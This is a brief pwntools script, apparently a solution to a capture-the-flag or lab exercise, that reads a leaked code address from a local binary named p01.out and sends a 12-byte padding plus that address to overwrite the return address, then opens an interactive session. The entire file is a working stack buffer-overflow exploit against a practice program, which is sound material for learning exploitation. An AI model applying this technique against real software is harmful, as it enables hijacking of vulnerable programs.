from pwn import *

p=process("./p01.out")

temp=p.recv(2)
entire=p.recv(5)
print("code area address:   "+entire)
retadr=p32(int((entire),16))
payload = "a"*12
payload += retadr
print("Send:    "+retadr)
p.sendline(payload)
result=p.recv(200)
print(result)

p.interactive()

